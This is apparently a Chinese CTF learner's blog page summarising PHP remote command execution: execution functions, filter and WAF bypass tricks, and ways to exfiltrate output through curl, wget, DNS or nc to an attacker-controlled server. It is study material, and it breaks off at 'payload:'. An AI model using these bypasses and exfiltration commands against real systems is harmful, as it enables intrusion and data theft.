@@ -1,0 +1,1344 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="rce学习小结, Atmujie">
+    <meta name="description" content="有一美人兮，见之不忘，一日不见兮，思之如狂；">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>rce学习小结 | Atmujie</title>
+    <link rel="icon" type="image/png" href="/weblogo.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Atmujie</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Atmujie</div>
+        <div class="logo-desc">
+            
+            有一美人兮，见之不忘，一日不见兮，思之如狂；
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">rce学习小结</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web/">
+                                <span class="chip bg-color">web</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-05-22
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="rce-代码执行函数"><a href="#rce-代码执行函数" class="headerlink" title="rce_代码执行函数"></a>rce_代码执行函数</h2><h3 id="eval-执行php代码"><a href="#eval-执行php代码" class="headerlink" title="eval() 执行php代码"></a>eval() 执行php代码</h3><p>eval() 函数把字符串按照 PHP 代码来计算。</p>
+<p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p>
+<p>如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p>
+<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(phpcode)</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">phpcode</td>
+<td align="left">必需。规定要计算的 PHP 代码。</td>
+</tr>
+</tbody></table>
+<h3 id="执行代码"><a href="#执行代码" class="headerlink" title="${}执行代码"></a><strong><code>$&#123;&#125;</code>执行代码</strong></h3><p>同eval()函数，常用于eval被过滤时</p>
+<h3 id="assert-检查一个断言是否为-false"><a href="#assert-检查一个断言是否为-false" class="headerlink" title="assert()  检查一个断言是否为 false"></a>assert()  检查一个断言是否为 <strong><code>false</code></strong></h3><p>语法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(条件); <span class="comment">#如果条件为错，终止程序执行，可以用于执行命令</span></span><br></pre></td></tr></table></figure>
+
+<p>相当于：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(假设成立)</span><br><span class="line">&#123;</span><br><span class="line">     程序正常运行；</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">      报错<span class="operator">&amp;&amp;</span>终止程序！（避免由程序运行引起更大的错误）  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>普通调用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?a=phpinfo()</span></span><br><span class="line"><span class="meta">&lt;?php</span> assert(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>assert函数支持动态调用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?a=phpinfo()</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>php官方在php7中更改了assert函数。在php7.0.29之后的版本不支持动态调用。</strong></p>
+<h3 id="preg-replace-正则匹配替换"><a href="#preg-replace-正则匹配替换" class="headerlink" title="preg_replace() 正则匹配替换"></a>preg_replace() 正则匹配替换</h3><p>语法：preg_replace(正则语句,字符串，要替换的字符串)</p>
+<p>/e参数  : 将字符串当作php代码执行</p>
+<p>执行代码需要使用/e修饰符。如果不使用/e修饰符，代码则不会执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = preg_replace(<span class="string">&quot;/abc/e&quot;</span>,<span class="variable">$b</span>,<span class="string">&#x27;abcd&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>/e在php7已弃用</strong></p>
+<h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><p>语法：create_function(变量部分，方法代码)</p>
+<p>如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&quot;echo 123&quot;</span>);</span><br><span class="line"><span class="comment">#类似于：</span></span><br><span class="line">fuction ft(<span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p><strong>php7.3 以弃用</strong></p>
+<h2 id="rce-命令执行函数"><a href="#rce-命令执行函数" class="headerlink" title="rce_命令执行函数"></a>rce_命令执行函数</h2><h3 id="system-执行外部程序，并且显示输出"><a href="#system-执行外部程序，并且显示输出" class="headerlink" title="system()   执行外部程序，并且显示输出"></a>system()   执行外部程序，并且显示输出</h3><p>语法：system(‘命令行命令’)；</p>
+<h3 id="passthru-执行外部命令"><a href="#passthru-执行外部命令" class="headerlink" title="passthru() 执行外部命令"></a>passthru() 执行外部命令</h3><p><strong>passthru()</strong> 函数 也是用来执行外部命令（<code>command</code>）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.exec.php">exec()</a> 或 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.system.php">system()</a> 函数。</p>
+<p><strong>语法：passthru(要执行的命令，要提供的参数【可选】);</strong></p>
+<h3 id="exec-执行外部程序"><a href="#exec-执行外部程序" class="headerlink" title="exec() 执行外部程序"></a>exec() 执行外部程序</h3><p>语法：</p>
+<p>exec ( string <code>$command</code> , array <code>&amp;$output</code> = ? , int <code>&amp;$return_var</code> = ? ) : string</p>
+<p><strong>exec()</strong> 执行 <code>command</code> 参数所指定的命令。</p>
+<ul>
+<li><p><code>command</code></p>
+<p>  要执行的命令。</p>
+</li>
+<li><p><code>output</code></p>
+<p>  如果提供了 <code>output</code> 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如 <code>\n</code> 字符。 请注意，如果数组中已经包含了部分元素，<strong>exec()</strong> 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入 <strong>exec()</strong> 函数之前 对数组使用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.unset.php">unset()</a> 函数进行重置。</p>
+</li>
+<li><p><code>return_var</code></p>
+<p>  如果同时提供 <code>output</code> 和 <code>return_var</code> 参数， 命令执行后的返回状态会被写入到此变量。</p>
+</li>
+</ul>
+<p>注意：exec()函数的执行结果不会被直接输出，需配合其他函数使用</p>
+<h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><p>同exec()函数，都不能直接打印出执行的结果</p>
+<p>但exec()函数执行的结果往往时一个总结，而shell_exec()函数使用echo 时会显示详细的结果</p>
+<h3 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h3><p>同exec()函数用法和特性一致</p>
+<h3 id="ob-start-打开缓冲区"><a href="#ob-start-打开缓冲区" class="headerlink" title="ob_start() 打开缓冲区"></a><strong>ob_start() 打开缓冲区</strong></h3><p>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。</p>
+<p>使用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ob_start(<span class="string">&quot;system&quot;</span>);</span><br><span class="line"><span class="comment">#当缓冲区激活时，所有来自PHP程序的非文件头信息均不会发送，而是保存在内部缓冲区。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    ob_end_flush();<span class="comment">#刷新缓冲区的内容，输出。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//输出www-data</span></span><br></pre></td></tr></table></figure>
+
+<p>内部缓冲区的内容可以用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.ob-get-contents.php">ob_get_contents()</a> 函数复制到一个字符串变量中。 想要输出存储在内部缓冲区中的内容，可以使用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.ob-end-flush.php">ob_end_flush()</a> 函数。另外， 使用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.ob-end-clean.php">ob_end_clean()</a> 函数会静默丢弃掉缓冲区的内容。</p>
+<p>语法：</p>
+<p>ob_start(output_callback)</p>
+<p>ob_start()中可选择一个output_callback函数传入，并将中间内容传入此函数，在ob_end_flush()时输出</p>
+<p>对命令的执行效果同exec()</p>
+<h1 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h1><h2 id="特殊字符过滤"><a href="#特殊字符过滤" class="headerlink" title="特殊字符过滤"></a>特殊字符过滤</h2><h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><p>在bash下，可以用以下字符代替空格</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;IFS&#125;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">IFS<span class="variable">$9</span></span></span><br><span class="line"><span class="meta">%</span><span class="bash">09</span></span><br><span class="line">&#123;cat,flag&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="敏感字符绕过"><a href="#敏感字符绕过" class="headerlink" title="敏感字符绕过"></a>敏感字符绕过</h3><ul>
+<li><p>利用变量绕过</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;$a=l;$b=s;$a$b;</span><br><span class="line">&gt;a=l;b=s;$a$b</span><br></pre></td></tr></table></figure>
+
+<p>执行ls</p>
+</blockquote>
+</li>
+<li><p>利用反斜杠绕过</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at 1.t\xt</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+<li><p>利用引号绕过</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c&#x27;&#x27;at /f&#x27;&#x27;lag</span><br><span class="line">c&quot;a&quot;t /&quot;f&quot;lag</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+<li><p>包裹拼接联合</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=l;$a&#x27;s&#x27;</span><br><span class="line">a=l;$a&#x27;&#x27;s</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210530091233295.png" alt="image-20210530091233295"></p>
+</blockquote>
+</li>
+<li><p>base64编码绕过</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;echo &#x27;cat&#x27; | base64</span><br><span class="line">&gt;Y2F0Cg==</span><br><span class="line">&gt;`echo &#x27;Y2F0Cg==&#x27; | base64 -d` 1.txt</span><br><span class="line">&gt;-d 代表decode,解码</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+<li><p>16进制编码绕过</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;ls&quot;|xxd</span><br><span class="line">6c73 0a</span><br><span class="line">`echo &quot;6c73&quot; | xxd -r -p`</span><br><span class="line">echo &quot;6c73&quot;|xxd -r -p |bash</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+<li><p>八进制绕过</p>
+</li>
+<li><p>使用<code>$*</code>和<code>$@</code>，<code>$x</code>,<code>$&#123;x&#125;</code></p>
+<p>  注：因为在没有传参的情况下，上面的特殊变量都是为空的</p>
+<p>  <img src="image-20210530094731904.png" alt="image-20210530094731904"></p>
+</li>
+<li><p>过滤文件名绕过（例如过滤/etc/passwd文件）</p>
+<p>  利用正则匹配绕过</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /???/pass*</span><br></pre></td></tr></table></figure>
+
+<p>  例如过滤/etc/passwd中的etc，利用未初始化变量，使用$u绕过</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc$u/passwd</span><br></pre></td></tr></table></figure>
+
+<p>  备注：此方法能绕CloudFlare WAF（出自：<a target="_blank" rel="noopener" href="https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/%EF%BC%89">https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/）</a></p>
+</li>
+<li><p>过滤目录分隔符</p>
+<blockquote>
+<p>使用多个管道或多cd绕过</p>
+</blockquote>
+<p>  <img src="image-20210530100850965.png" alt="image-20210530100850965"></p>
+</li>
+<li><p>ip进制转换</p>
+<blockquote>
+<p>ip地址使用点分十进制，先转二进制再转十进制后可以得到一串数字，直接访问得到的数字，同样可以访问目标网站</p>
+<p>如百度：220.181.38.148</p>
+<p>转换后：<strong>3702859412</strong> </p>
+<p>转换网址：<a target="_blank" rel="noopener" href="http://www.msxindl.com/tools/ip/ip_num.asp">http://www.msxindl.com/tools/ip/ip_num.asp</a></p>
+</blockquote>
+</li>
+<li><p>同义命令绕过</p>
+<blockquote>
+<p>more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容<br>sh /flag 2&gt;%261  //报错出文件内容</p>
+</blockquote>
+</li>
+</ul>
+<h4 id="过滤分隔符"><a href="#过滤分隔符" class="headerlink" title="过滤分隔符"></a>过滤分隔符</h4><ul>
+<li><p>可以使用%0a代替，%0a其实在某种程度上是最标准的命令链接符号</p>
+<p>  功能    符号    payload<br>  换行符    %0a    ?cmd=123%0als<br>  回车符    %0d    ?cmd=123%0dls<br>  连续指令    ;    ?1=123;pwd<br>  后台进程    &amp;    ?1=123&amp;pwd<br>  管道    |    ?1=123|pwd<br>  逻辑运算    ||或&amp;&amp;    ?1=123&amp;&amp;pwd</p>
+</li>
+<li><p><code>?&gt;</code>代替<code>;</code></p>
+<p>  在php中可以用<code>?&gt;</code>来代替最后一个<code>;</code>因为php遇到定界符关闭标志时，系统会自动在PHP语句之后加上一个分号。</p>
+</li>
+</ul>
+<h3 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h3><ul>
+<li><p>命令联合</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat `ls` 等同于 cat 1.txt;cat 1.php ...</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210530091727625.png" alt="image-20210530091727625"></p>
+</blockquote>
+<blockquote>
+<p><code>*</code>未过滤使使用<code>*</code>更佳</p>
+</blockquote>
+</li>
+<li><p>文件命令读取</p>
+<blockquote>
+<p>sh命令可读取文件中的命令执行</p>
+<p>\ 可用作命名换行符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch &#x27;t *;\&#x27;</span><br><span class="line">ls -t&gt; &#x27;ca\&#x27;</span><br><span class="line">sh ca\\</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>  <img src="image-20210530104005829.png" alt="image-20210530104005829"></p>
+</li>
+</ul>
+<h3 id="无回显情况的命令执行"><a href="#无回显情况的命令执行" class="headerlink" title="无回显情况的命令执行"></a>无回显情况的命令执行</h3><h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><blockquote>
+<p>类似 ls &gt; 1 会将ls 命令得到的内容全部导入名为1的文件，访问这个文件即可得到命令执行的结果</p>
+</blockquote>
+<p><img src="image-20210529202135353.png" alt="image-20210529202135353"></p>
+<h4 id="利用自己的服务器发送文件"><a href="#利用自己的服务器发送文件" class="headerlink" title="利用自己的服务器发送文件"></a>利用自己的服务器发送文件</h4><blockquote>
+<p>先在存在命令执行的服务器上开启端口监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 端口号 </span><br><span class="line">可以发送给一个文件</span><br><span class="line">nc -lnvp 端口号 &gt; 123.txt</span><br></pre></td></tr></table></figure>
+
+<p>然后开启自己的服务器，访问被我们监听的端口，得到数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -vz -w2 ip地址 被监听的端口号 </span><br><span class="line">写入文件</span><br><span class="line">nc -v -w2 ip地址 被监听的端口号 &lt; 123.txt</span><br></pre></td></tr></table></figure>
+
+<p>若存在命令执行，我们可以直接通过nc命令将木马发给服务器</p>
+</blockquote>
+<h4 id="利用服务器进行监听"><a href="#利用服务器进行监听" class="headerlink" title="利用服务器进行监听"></a>利用服务器进行监听</h4><blockquote>
+<p>在自己服务器上开始端口监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lv 端口号</span><br></pre></td></tr></table></figure>
+
+<p>在存在命令执行漏洞的服务器中访问服务器端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl 服务器ip/`命令`</span><br><span class="line">例如：</span><br><span class="line">curl http://ip:8001/`ls | base64`</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="image-20210529215018111-1622296218513.png" alt="image-20210529215018111"></p>
+<h4 id="在vps上建立记录脚本"><a href="#在vps上建立记录脚本" class="headerlink" title="在vps上建立记录脚本"></a>在vps上建立记录脚本</h4><p>在自己的公网服务器站点根目录写入php文件，内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$f</span> = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$f</span>,<span class="variable">$data</span>);</span><br><span class="line">fclose(<span class="variable">$f</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在目标服务器的测试点可以发送下面其中任意一条请求进行测试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="comment">//*.*.*.**/record.php?data=`cat flag.php|base64`</span></span><br><span class="line">wget http:<span class="comment">//*.*.*.*/record.php?data=`cat flag.php|base64`</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="通过http请求-dns请求等方式带出数据"><a href="#通过http请求-dns请求等方式带出数据" class="headerlink" title="通过http请求/dns请求等方式带出数据"></a>通过http请求/dns请求等方式带出数据</h4><p>利用doslog：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl `命令`.域名</span><br></pre></td></tr></table></figure>
+
+<h4 id="linux-tee命令"><a href="#linux-tee命令" class="headerlink" title="linux tee命令"></a>linux tee命令</h4><p>Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用法:</span><br><span class="line">tee file1 file2 //复制文件</span><br><span class="line">ls /|tee 1.txt //命令输出</span><br></pre></td></tr></table></figure>
+
+<h4 id="dev-null-2-gt-amp-1类无回显"><a href="#dev-null-2-gt-amp-1类无回显" class="headerlink" title="/dev/null 2&gt;&amp;1类无回显"></a>/dev/null 2&gt;&amp;1类无回显</h4><p>例题：ctfshow-web入门42</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p><code>&gt;/dev/null 2&gt;&amp;1主要意思是不进行回显的意思</code><br>进行命令分隔即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;	//分号</span><br><span class="line">|	//只执行后面那条命令</span><br><span class="line">||	//只执行前面那条命令</span><br><span class="line">&amp;	//两条命令都会执行</span><br><span class="line">&amp;&amp;	//两条命令都会执行</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
